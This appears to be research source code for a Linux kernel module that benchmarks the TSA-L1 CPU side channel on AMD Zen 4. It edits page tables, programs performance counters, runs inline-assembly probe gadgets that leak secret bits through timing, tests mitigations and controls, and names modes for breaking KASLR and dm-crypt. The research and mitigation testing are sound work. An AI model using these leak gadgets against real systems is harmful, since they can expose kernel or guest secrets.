/*
 * tsa_bench_ioctl.c
 *
 * TSA-L1 benchmark kernel module with ioctl control interface.
 *
 * This version keeps the original probe_D1 inline-assembly probing path intact.
 * Benchmark parameters are controlled from userspace through /dev/tsa_bench.
 * Results are printed as machine-parseable dmesg lines starting with:
 *
 *   BMK,RESULT,...
 *
 * Userspace collector: tsa_bench_collect.py
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sort.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/sched.h>
#include <linux/irqflags.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/ktime.h>
#include <linux/mutex.h>

#include <asm/processor.h>
#include <asm/pgtable.h>
#include <asm/page.h>
#include <asm/io.h>
#include <asm/fpu/api.h>
#include <asm/msr.h>
#include <asm/extable.h>

#include "vmrun/vmrun.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alessandro Vezzù");
MODULE_AUTHOR("Benedict Schlüter");
MODULE_DESCRIPTION("TSA-L1 benchmark module with ioctl control and parseable dmesg output");

/* ------------------------------------------------------------------ */
/* Zen 4 Performance Counter Configuration                            */
/* ------------------------------------------------------------------ */
#define MSR_ZEN4_PERF_CTL0 0xC0010200
#define MSR_ZEN4_PERF_CTR0 0xC0010201

#define MAX_EVENT_ID 0xFFF
#define MAX_UMASK_ID 0xFF

/* ------------------------------------------------------------------ */
/* Benchmark ioctl ABI                                                */
/* ------------------------------------------------------------------ */
#define TSA_BENCH_MAX_LIST 32

#define TSA_BENCH_1_ACCURACY_VS_SAMPLES  (1U << 0)
#define TSA_BENCH_2_SECRET_LENGTH        (1U << 1)
#define TSA_BENCH_3_WORKING_PMCS         (1U << 2)
#define TSA_BENCH_4_VIRT_VS_PHYS         (1U << 3)
#define TSA_BENCH_5_MITIGATION           (1U << 4)
#define TSA_BENCH_6_NEGATIVE_CONTROLS    (1U << 5)
#define TSA_BENCH_7_VMRUN                (1U << 6)
#define TSA_BENCH_8_SINGLSTEP            (1U << 7)
#define TSA_BENCH_9_4K_ALIAS_STLF        (1U << 8)
#define TSA_BENCH_10_1GIB_LEAK_RATE      (1U << 9)

#define TSA_ACCESS_VIRTUAL               1U
#define TSA_ACCESS_PHYSICAL              2U
#define TSA_ACCESS_VMRUN                 3U
#define TSA_BREAK_KASLR                  4U
#define TSA_BREAK_DM_CRYPT               5U

#define TSA_MIT_NONE                     0U
#define TSA_MIT_VERW                     (1U << 0)
#define TSA_MIT_WBINVD                   (1U << 1)
#define TSA_MIT_L1D_FLUSH                (1U << 2)
#define TSA_MIT_CFLUSH                   (1U << 3)

#define TSA_NEG_NONE                     0U
#define TSA_NEG_NO_TARGET_TLB_FLUSH      (1U << 0)
#define TSA_NEG_REP_MOVS                 (1U << 1)
#define TSA_NEG_DIV_SQRT_PORT            (1U << 2)
#define TSA_NEG_VECTOR_MASKING           (1U << 3)
#define TSA_NEG_ADDRESS_TRANSLATION      (1U << 4)
#define TSA_NEG_STLF                     (1U << 5)

struct tsa_bench_args {
    u64 run_id;
    u32 bench_mask;
    u32 repeats;

    u32 n_samples;
    u32 samples[TSA_BENCH_MAX_LIST];

    u32 n_secret_bits;
    u32 secret_bits[TSA_BENCH_MAX_LIST];

    u32 event_start;
    u32 event_end;
    u32 umask_start;
    u32 umask_end;

    u32 accuracy_threshold_permille;
    u32 mitigation_mask;
    u32 access_mask;
    u32 negative_mask;

    u32 default_samples;
    u32 default_secret_bits;
    u32 default_event;
};

#define TSA_IOCTL_MAGIC       'T'
#define TSA_IOCTL_START_BENCH _IOW(TSA_IOCTL_MAGIC, 0x42, struct tsa_bench_args)

/* ------------------------------------------------------------------ */
/* Configuration                                                       */
/* ------------------------------------------------------------------ */

#ifdef TSA_4LEVEL_PAGING
#define BASE_VA 0xFFFF000000000000ull
#else
#define BASE_VA 0xFF00000000000000ull
#endif

#define VICTIM_VA    (BASE_VA + 0x0000888398C02000ULL)
#define ATTACK_VA    (BASE_VA + 0x000088839CC00000ULL)
#define CHASE_VA     (BASE_VA + 0x0000880000002000ULL)

static uint64_t PHYS_BASE = 0;
static uint64_t PHYS_BASE_BUF = 0;
static uint64_t SECRET_VALUE = 0;
static uint64_t VICTIM_VA_PHYS = 0;
static uint64_t ATTACK_VA_PHYS = 0;

#define PAGE_OFFSET_CACHED 0x610

#define PHYS_RESERVED_BASE 0x300000000ULL

#define MAP_SIZE             4096
#define MAX_SECRET_BITS      512
#define DEFAULT_SECRET_BITS  32
#define DEFAULT_SWEEP_PROBES 100
#define MAX_SWEEP_PROBES     512

#define DEFAULT_EVENT        0x00
#define DEFAULT_ACCURACY_THRESHOLD_PERMILLE 875
#define TSA_REUSED_SECRET_BITS 512
#define TSA_SCALED_RECALIBRATE_BITS TSA_REUSED_SECRET_BITS
#define TSA_SCALED_LEAK_BITS (40U << 10)

/* ------------------------------------------------------------------ */
/* Page Table Manipulation                                            */
/* ------------------------------------------------------------------ */
#define PAGE_PRESENT 0x1
#define PAGE_RW 0x2
#define PAGE_USER 0x4
#define PAGE_SIZE_4K 4096

static struct task_struct *tsa_thread;

static struct vcpu_svm *svm_vmrun;
static bool spec_ctrl_intercepted_vmrun;
static struct sev_es_save_area *hostsa_vmrun;

extern struct vcpu_svm *svm_export;
extern struct sev_es_save_area* sev_es_sa_export;
extern bool spec_ctrl_intercepted_export;

static inline unsigned long read_cr3(void)
{
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    return cr3;
}

#ifdef TSA_4LEVEL_PAGING
static void map_physical_to_virtual(unsigned long phys_addr,
                                    unsigned long virt_addr,
                                    u64 additional_pte_flags)
{
    unsigned long *pml4, *pdp, *pd, *pt;
    unsigned long index4, index3, index2, index1;

    pml4 = (unsigned long *)__va(read_cr3() & ~0xFFFull);

    index4 = (virt_addr >> 39) & 0x1FF;
    index3 = (virt_addr >> 30) & 0x1FF;
    index2 = (virt_addr >> 21) & 0x1FF;
    index1 = (virt_addr >> 12) & 0x1FF;

    if (!pml4[index4])
    {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return;

        pml4[index4] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }

    pdp = (unsigned long *)__va(pml4[index4] & PAGE_MASK);

    if (!pdp[index3])
    {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return;

        pdp[index3] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }

    pd = (unsigned long *)__va(pdp[index3] & PAGE_MASK);

    if (!pd[index2])
    {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return;

        pd[index2] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }

    pt = (unsigned long *)__va(pd[index2] & PAGE_MASK);

    pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | additional_pte_flags;

    smp_wmb();
    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");
}
#else
static void map_physical_to_virtual(unsigned long phys_addr, unsigned long virt_addr, u64 addtional_pte_flags)
{
    unsigned long *pml5, *pml4, *pdp, *pd, *pt;
    unsigned long index5, index4, index3, index2, index1;

    pml5 = (unsigned long *)__va(read_cr3() & ~0xFFFull);

    index5 = (virt_addr >> 48) & 0x1FF;
    index4 = (virt_addr >> 39) & 0x1FF;
    index3 = (virt_addr >> 30) & 0x1FF;
    index2 = (virt_addr >> 21) & 0x1FF;
    index1 = (virt_addr >> 12) & 0x1FF;

    if (!pml5[index5])
    {
        pml5[index5] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pml4 = (unsigned long *)__va(pml5[index5] & PAGE_MASK);
    if (!pml4[index4])
    {
        pml4[index4] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pdp = (unsigned long *)__va(pml4[index4] & PAGE_MASK);
    if (!pdp[index3])
    {
        pdp[index3] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pd = (unsigned long *)__va(pdp[index3] & PAGE_MASK);
    if (!pd[index2])
    {
        pd[index2] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pt = (unsigned long *)__va(pd[index2] & PAGE_MASK);
    if (!pt[index1])
    {
        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
    }
    else
    {
        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
    }

    smp_wmb();
    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");
    asm volatile("mfence\nlfence" ::: "memory");
}
#endif

/* ------------------------------------------------------------------ */
/* Low-level CPU primitives                                           */
/* ------------------------------------------------------------------ */
static inline void mfence_lfence(void)
{
    __asm__ volatile("mfence\nlfence" : : : "memory");
}

static inline void tsa_do_verw(void)
{
    u16 sel = 0;
    asm volatile("verw %0" : "+m"(sel) : : "cc", "memory");
}

static inline void tsa_do_wbinvd(void)
{
    asm volatile("wbinvd" ::: "memory");
    mfence_lfence();
}

static inline void tsa_do_l1d_flush(void)
{
    u32 lo = 1;
    u32 hi = 0;

    asm volatile(
        "wrmsr\n\t"
        "mfence\n\t"
        "lfence\n\t"
        :
        : "c"(0x10b), "a"(lo), "d"(hi)
        : "memory");
}

static inline void tsa_do_clflush(volatile void *addr)
{
    asm volatile("clflush (%0)" :: "r"(addr) : "memory");
    mfence_lfence();
}

static inline bool cpu_has_l1d_flush(void)
{
    return boot_cpu_has(X86_FEATURE_FLUSH_L1D);
}

static inline void tsa_apply_mitigation(u32 mitigation)
{
    if (mitigation & TSA_MIT_VERW)
        tsa_do_verw();

    if (mitigation & TSA_MIT_WBINVD)
        tsa_do_wbinvd();

    if (mitigation & TSA_MIT_L1D_FLUSH)
        tsa_do_l1d_flush();

    if (mitigation & TSA_MIT_CFLUSH)
        tsa_do_clflush((void *)VICTIM_VA);
}

/* ------------------------------------------------------------------ */
/* Secret pattern helpers                                             */
/* ------------------------------------------------------------------ */
static inline u64 secret_word_for_index(int word_idx)
{
    static const u64 pattern[8] = {
        0xdeadbeefcafebabeULL,
        0x0123456789abcdefULL,
        0xfedcba9876543210ULL,
        0x0f0f0f0f55aa55aaULL,
        0xaaaaaaaa55555555ULL,
        0x1122334455667788ULL,
        0x8877665544332211ULL,
        0x1337133713371337ULL,
    };

    return pattern[word_idx & 7];
}

static void fill_secret_region(volatile u8 *victim, int secret_bits)
{
    int words = (secret_bits + 63) / 64;
    int i;

    if (words < 1)
        words = 1;
    if (words > 8)
        words = 8;

    for (i = 0; i < words; i++)
        ((volatile u64 *)victim)[i] = secret_word_for_index(i);

    mfence_lfence();
}

static int true_secret_bit(int bit_idx)
{
    int word_idx = bit_idx / 64;
    int local_bit = bit_idx & 63;

    return (secret_word_for_index(word_idx) >> local_bit) & 1;
}

/* ------------------------------------------------------------------ */
/* Gadget D1 — original probing path                                  */
/* ------------------------------------------------------------------ */
static noinline __aligned(4096) uint64_t probe_D1(volatile uint8_t *victim,
                                                  volatile uint8_t *target,
                                                  uint64_t bit_idx,
                                                  volatile uint64_t *chase_head,
                                                  u32 mitigation)
{
    uint64_t elapsed;
    unsigned long flags;

    local_irq_save(flags);

    asm volatile("sfence" ::: "memory");
    asm volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head) : "rax", "memory");
    asm volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head + 128) : "rax", "memory");

    mfence_lfence();
    asm volatile("invlpg (%0)" :: "r"(target) : "memory");
    asm volatile("movq (%0),%%rax" :: "r"(victim) : "rax", "memory");
    tsa_apply_mitigation(mitigation);
    mfence_lfence();

    __asm__ volatile(
        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax,%%r8\n\t"
        "movq %%rdx,%%r11\n\t"

        "movb %b[bit], %%cl\n\t"

        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        ".rept 20\n\t"
        "leaq (%%r10, %%r9), %%rsi\n\t"
        "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32,%%r11\n\t"
        "orq %%r11,%%r8\n\t"

        "shlq $32,%%rdx\n\t"
        "orq %%rdx,%%rax\n\t"
        "subq %%r8,%%rax\n\t"

        : "=&a"(elapsed)
        : [tgt] "r"(target),
          [bit] "r"(bit_idx),
          [chase] "r"(chase_head)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "memory");

    local_irq_restore(flags);
    return elapsed;
}

static noinline __aligned(4096) uint64_t probe_4k_alias_stlf(volatile uint8_t *victim,
                                                             volatile uint8_t *target,
                                                             uint64_t bit_idx,
                                                             volatile uint64_t *chase_head,
                                                             u32 mitigation)
{
    uint64_t elapsed;
    unsigned long flags;
    u64 secret = (u64)*(volatile uint32_t *)victim;

    (void)mitigation;

    local_irq_save(flags);

    asm volatile("sfence" ::: "memory");
    asm volatile("movq (%0), %%rax\n\t"
                 "lfence\n\t"
                 :: "r"(chase_head)
                 : "rax", "memory");
    asm volatile("movq (%0), %%rax\n\t"
                 "lfence\n\t"
                 :: "r"(chase_head + 128)
                 : "rax", "memory");

    mfence_lfence();

    asm volatile(
        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax, %%r8\n\t"
        "movq %%rdx, %%r11\n\t"

        "movb %b[bit], %%cl\n\t"

        "movq %[secret], (%[victim])\n\t"

        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        ".rept 20\n\t"
        "movq %%r10, %%rsi\n\t"
        "addq %%r9, %%rsi\n\t"
        "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32, %%r11\n\t"
        "orq %%r11, %%r8\n\t"

        "shlq $32, %%rdx\n\t"
        "orq %%rdx, %%rax\n\t"
        "subq %%r8, %%rax\n\t"
        : "=&a"(elapsed)
        : [tgt] "r"(target),
          [bit] "q"(bit_idx),
          [chase] "r"(chase_head),
          [victim] "r"(victim),
          [secret] "r"(secret)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11",
          "cc", "memory");

    local_irq_restore(flags);
    return elapsed;
}

static noinline __aligned(4096) uint64_t probe_vmsave(volatile uint8_t *victim,
                                                  volatile uint8_t *target,
                                                  uint64_t bit_idx,
                                                  volatile uint64_t *chase_head,
                                                  u32 is_calibration)
{
    uint64_t elapsed;
    unsigned long flags;

    local_irq_save(flags);

    asm volatile("sfence" ::: "memory");
    asm volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head) : "rax", "memory");
    asm volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head + 128) : "rax", "memory");

    mfence_lfence();
    asm volatile("invlpg (%0)" :: "r"(target) : "memory");

    if(is_calibration)
    {
        asm volatile("movq (%0),%%rax" :: "r"(victim) : "rax", "memory");
    }else{
        asm volatile("vmsave %0" :: "a"(PHYS_BASE) : "memory");
    }

    mfence_lfence();

    __asm__ volatile(
        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax,%%r8\n\t"
        "movq %%rdx,%%r11\n\t"

        "movb %b[bit], %%cl\n\t"

        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        ".rept 20\n\t"
        "leaq (%%r10, %%r9), %%rsi\n\t"
        "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32,%%r11\n\t"
        "orq %%r11,%%r8\n\t"

        "shlq $32,%%rdx\n\t"
        "orq %%rdx,%%rax\n\t"
        "subq %%r8,%%rax\n\t"

        : "=&a"(elapsed)
        : [tgt] "r"(target),
          [bit] "r"(bit_idx),
          [chase] "r"(chase_head)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "memory");

    local_irq_restore(flags);
    return elapsed;
}

static noinline __aligned(4096) uint64_t probe_vmrun(volatile uint8_t *victim,
                                                  volatile uint8_t *target,
                                                  uint64_t bit_idx,
                                                  volatile uint64_t *chase_head,
                                                  u32 is_calibration)
{
    uint64_t elapsed;
    unsigned long flags;

    local_irq_save(flags);

    asm volatile("sfence" ::: "memory");
    asm volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head) : "rax", "memory");
    asm volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head + 128) : "rax", "memory");

    mfence_lfence();
    asm volatile("invlpg (%0)" :: "r"(target) : "memory");

    if(is_calibration)
    {
        asm volatile("movq (%0),%%rax" :: "r"(victim) : "rax", "memory");
    }else{
        vmrun(svm_vmrun, spec_ctrl_intercepted_vmrun, hostsa_vmrun);
    }

    mfence_lfence();

    __asm__ volatile(
        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax,%%r8\n\t"
        "movq %%rdx,%%r11\n\t"

        "movb %b[bit], %%cl\n\t"

        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        ".rept 20\n\t"
        "leaq (%%r10, %%r9), %%rsi\n\t"
        "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32,%%r11\n\t"
        "orq %%r11,%%r8\n\t"

        "shlq $32,%%rdx\n\t"
        "orq %%rdx,%%rax\n\t"
        "subq %%r8,%%rax\n\t"

        : "=&a"(elapsed)
        : [tgt] "r"(target),
          [bit] "r"(bit_idx),
          [chase] "r"(chase_head)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "memory");

    local_irq_restore(flags);
    return elapsed;
}

/* Negative-control variant for only the no-TLB-flush control.
 * The asm probing body is kept identical; only the precondition differs.
 */
static noinline __aligned(4096) uint64_t probe_D1_no_target_tlb_flush(volatile uint8_t *victim,
                                                                      volatile uint8_t *target,
                                                                      uint64_t bit_idx,
                                                                      volatile uint64_t *chase_head,
                                                                      u32 mitigation)
{
    uint64_t elapsed;
    unsigned long flags;

    local_irq_save(flags);

    asm volatile("sfence" ::: "memory");
    asm volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head) : "rax", "memory");
    asm volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head + 128) : "rax", "memory");

    mfence_lfence();
    // No TLB flush on target address here, unlike in the main probe_D1 path.
    asm volatile("movq (%0),%%rax" :: "r"(victim) : "rax", "memory");
    tsa_apply_mitigation(mitigation);
    mfence_lfence();

    __asm__ volatile(
        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax,%%r8\n\t"
        "movq %%rdx,%%r11\n\t"

        "movb %b[bit], %%cl\n\t"

        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        ".rept 20\n\t"
        "leaq (%%r10, %%r9), %%rsi\n\t"
        "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32,%%r11\n\t"
        "orq %%r11,%%r8\n\t"

        "shlq $32,%%rdx\n\t"
        "orq %%rdx,%%rax\n\t"
        "subq %%r8,%%rax\n\t"

        : "=&a"(elapsed)
        : [tgt] "r"(target),
          [bit] "r"(bit_idx),
          [chase] "r"(chase_head)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "memory");

    local_irq_restore(flags);
    return elapsed;
}

typedef uint64_t (*probe_func_t)(volatile uint8_t *victim,
                                 volatile uint8_t *target,
                                 uint64_t bit_idx,
                                 volatile uint64_t *chase_head,
                                 u32 mitigation);

/**
 * Add here any future negative-control-specific probe variants, and update the selection logic accordingly.
 */
static probe_func_t select_probe_for_negative_control(u32 negative_control)
{
    if (negative_control == TSA_NEG_NO_TARGET_TLB_FLUSH)
        return probe_D1_no_target_tlb_flush;

    return probe_D1;
}

/* ------------------------------------------------------------------ */
/* Kernel Filter Engine with Otsu Thresholding                        */
/* ------------------------------------------------------------------ */
typedef struct {
    uint64_t threshold;
    uint64_t mean0;
    uint64_t mean1;
    int one_is_high;
} calib_t;

typedef struct {
    int pred_bit;
    int high_votes;
    int low_votes;
    uint64_t avg;
} bit_res_t;

static int cmp_u64(const void *a, const void *b)
{
    uint64_t va = *(const uint64_t *)a;
    uint64_t vb = *(const uint64_t *)b;

    if (va > vb)
        return 1;
    if (va < vb)
        return -1;
    return 0;
}

static uint64_t avg_u64_array(uint64_t *arr, int n)
{
    uint64_t sum = 0;
    int i;

    if (!arr || n <= 0)
        return 0;

    for (i = 0; i < n; i++)
        sum += arr[i];

    return sum / n;
}

static uint64_t otsu_threshold_two_arrays(uint64_t *a, int na,
                                          uint64_t *b, int nb)
{
    uint64_t total_sum = 0;
    uint64_t prefix_sum = 0;
    uint64_t best_threshold = 0;

    unsigned __int128 best_num = 0;
    unsigned __int128 best_den = 1;

    int n = na + nb;
    int ia = 0;
    int ib = 0;
    int k;

    uint64_t prev_val = 0;
    uint64_t cur_val = 0;
    uint64_t next_val = 0;

    if (!a || !b || na <= 0 || nb <= 0)
        return 0;

    sort(a, na, sizeof(uint64_t), cmp_u64, NULL);
    sort(b, nb, sizeof(uint64_t), cmp_u64, NULL);

    for (k = 0; k < na; k++)
        total_sum += a[k];

    for (k = 0; k < nb; k++)
        total_sum += b[k];

    if (a[na / 2] < b[nb / 2])
        best_threshold = (a[na / 2] + b[nb / 2]) / 2;
    else
        best_threshold = (b[nb / 2] + a[na / 2]) / 2;

    ia = 0;
    ib = 0;

    for (k = 0; k < n - 1; k++) {
        uint64_t w0;
        uint64_t w1;
        int64_t diff_signed;
        unsigned __int128 diff;
        unsigned __int128 num;
        unsigned __int128 den;
        unsigned __int128 lhs;
        unsigned __int128 rhs;

        if (ia < na && (ib >= nb || a[ia] <= b[ib])) {
            cur_val = a[ia++];
        } else {
            cur_val = b[ib++];
        }

        prefix_sum += cur_val;

        if (ia < na && (ib >= nb || a[ia] <= b[ib])) {
            next_val = a[ia];
        } else if (ib < nb) {
            next_val = b[ib];
        } else {
            break;
        }

        if (cur_val == next_val) {
            prev_val = cur_val;
            continue;
        }

        w0 = k + 1;
        w1 = n - w0;

        if (w0 == 0 || w1 == 0) {
            prev_val = cur_val;
            continue;
        }

        diff_signed = (int64_t)(total_sum * w0 - prefix_sum * n);

        if (diff_signed < 0)
            diff = (unsigned __int128)(-diff_signed);
        else
            diff = (unsigned __int128)diff_signed;

        num = diff * diff;
        den = (unsigned __int128)w0 * w1;

        lhs = num * best_den;
        rhs = best_num * den;

        if (lhs > rhs) {
            best_num = num;
            best_den = den;
            best_threshold = (cur_val + next_val) / 2;
        }

        prev_val = cur_val;
    }

    return best_threshold;
}

static bit_res_t classify_samples_otsu(uint64_t *times,
                                       int count,
                                       const calib_t *cal)
{
    bit_res_t res = {0};
    uint64_t sum = 0;
    int i;

    if (!times || !cal || count <= 0)
        return res;

    for (i = 0; i < count; i++) {
        sum += times[i];

        if (times[i] > cal->threshold)
            res.high_votes++;
        else
            res.low_votes++;
    }

    res.avg = sum / count;

    if (cal->one_is_high) {
        res.pred_bit = (res.high_votes > res.low_votes) ? 1 : 0;
    } else {
        res.pred_bit = (res.low_votes > res.high_votes) ? 1 : 0;
    }

    return res;
}

/* ------------------------------------------------------------------ */
/* Sweep Logic & Otsu Calibration                                     */
/* ------------------------------------------------------------------ */
static void configure_pmc(int evt, int umask);

static void fast_measure_interleaved_swapped(volatile uint8_t *victim,
                                             volatile uint8_t *target,
                                             volatile uint64_t *chase,
                                             uint64_t *times0,
                                             uint64_t *times1,
                                             int samples,
                                             probe_func_t probe,
                                             u32 mitigation)
{
    int i;

    for (i = 0; i < samples; i += 2) {
        *(volatile uint32_t *)victim = 0;
        mfence_lfence();
        times0[i] = probe(victim, target, 3, chase, mitigation);

        *(volatile uint32_t *)victim = 0xffffffff;
        mfence_lfence();
        times1[i] = probe(victim, target, 3, chase, mitigation);

        if (i + 1 < samples) {
            *(volatile uint32_t *)victim = 0xffffffff;
            mfence_lfence();
            times1[i + 1] = probe(victim, target, 3, chase, mitigation);

            *(volatile uint32_t *)victim = 0;
            mfence_lfence();
            times0[i + 1] = probe(victim, target, 3, chase, mitigation);
        }
    }
}

static calib_t run_test_case(volatile uint8_t *victim,
                             volatile uint8_t *target,
                             volatile uint64_t *chase,
                             uint64_t *times0,
                             uint64_t *times1,
                             int samples,
                             probe_func_t probe,
                             u32 mitigation)
{
    calib_t cal = {0};

    if (!times0 || !times1 || samples <= 0) {
        pr_err("vmalloc failed or invalid sample count\n");
        return cal;
    }

    fast_measure_interleaved_swapped(victim, target, chase, times0, times1, samples, probe, mitigation);

    cal.mean0 = avg_u64_array(times0, samples);
    cal.mean1 = avg_u64_array(times1, samples);

    cal.threshold = otsu_threshold_two_arrays(times0, samples, times1, samples);
    cal.one_is_high = (cal.mean1 > cal.mean0) ? 1 : 0;

    return cal;
}

static bit_res_t measure_single_bit_otsu(volatile uint8_t *victim,
                                         volatile uint8_t *target,
                                         uint64_t bit_idx,
                                         volatile uint64_t *chase,
                                         uint64_t *times,
                                         const calib_t *cal,
                                         int samples,
                                         probe_func_t probe,
                                         u32 mitigation)
{
    int i;

    for (i = 0; i < samples; i++) {
        volatile uint32_t s = *(volatile uint32_t *)victim;
        (void)s;

        times[i] = probe(victim, target, bit_idx, chase, mitigation);
    }

    return classify_samples_otsu(times, samples, cal);
}


static uint64_t run_extraction_secret(volatile uint8_t *victim,
                                volatile uint8_t *target,
                                volatile uint64_t *chase,
                                const calib_t *cal,
                                uint64_t *times,
                                int samples,
                                int secret_bits,
                                probe_func_t probe,
                                u32 mitigation)
{
    int b;
    uint64_t predicted = 0;

    for (b = 0; b < secret_bits; b++) {
        int local_bit = b & 63;
        volatile uint8_t *target_word = target + ((b / 64) * 8);
        bit_res_t res;

        res = measure_single_bit_otsu(victim,
                                      target_word,
                                      local_bit,
                                      chase,
                                      times,
                                      cal,
                                      samples,
                                      probe,
                                      mitigation);

        if (res.pred_bit)
            predicted |= (1ULL << b);
    }

    return predicted;
}

static int run_extraction_physical_bits(volatile uint8_t *victim,
                                volatile uint8_t *target,
                                volatile uint64_t *chase,
                                const calib_t *cal,
                                uint64_t *times,
                                int samples,
                                int secret_bits,
                                probe_func_t probe,
                                u32 mitigation)
{
    int b;
    int correct = 0;

    uint64_t secret = SECRET_VALUE;

    for (b = 0; b < secret_bits; b++) {
        int true_bit = (secret >> b) & 1;
        int local_bit = b & 63;
        volatile uint8_t *target_word = target + ((b / 64) * 8);
        bit_res_t res;

        res = measure_single_bit_otsu(victim,
                                      target_word,
                                      local_bit,
                                      chase,
                                      times,
                                      cal,
                                      samples,
                                      probe,
                                      mitigation);

        if (res.pred_bit == true_bit)
            correct++;
    }

    return correct;
}

static int run_extraction_bits(volatile uint8_t *victim,
                               volatile uint8_t *target,
                               volatile uint64_t *chase,
                               const calib_t *cal,
                               uint64_t *times,
                               int samples,
                               int secret_bits,
                               probe_func_t probe,
                               u32 mitigation)
{
    int b;
    int correct = 0;

    fill_secret_region(victim, secret_bits);

    for (b = 0; b < secret_bits; b++) {
        int true_bit = true_secret_bit(b);
        int local_bit = b & 63;
        volatile uint8_t *target_word = target + ((b / 64) * 8);
        bit_res_t res;

        res = measure_single_bit_otsu(victim,
                                      target_word,
                                      local_bit,
                                      chase,
                                      times,
                                      cal,
                                      samples,
                                      probe,
                                      mitigation);


        if (res.pred_bit == true_bit)
            correct++;
    }

    return correct;
}

static u64 make_pmc_config(u16 evt, u8 umask)
{
    u64 config = 0;

    config |= (evt & 0x0ffULL);           /* EventSelect[7:0]   -> bits 7:0 */
    config |= ((u64)umask << 8);          /* UnitMask[7:0]      -> bits 15:8 */

    config |= (1ULL << 16);               /* USR */
    config |= (1ULL << 17);               /* OS  */
    config |= (1ULL << 22);               /* EN  */

    config |= ((u64)(evt & 0xf00ULL) << 24); /* EventSelect[11:8] -> bits 35:32 */

    return config;
}

static void configure_pmc(int evt, int umask)
{
    wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
    wrmsrl(MSR_ZEN4_PERF_CTR0, 0ULL);
    wrmsrl(MSR_ZEN4_PERF_CTL0, make_pmc_config(evt, umask));
}

static void disable_pmc(void)
{
    wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
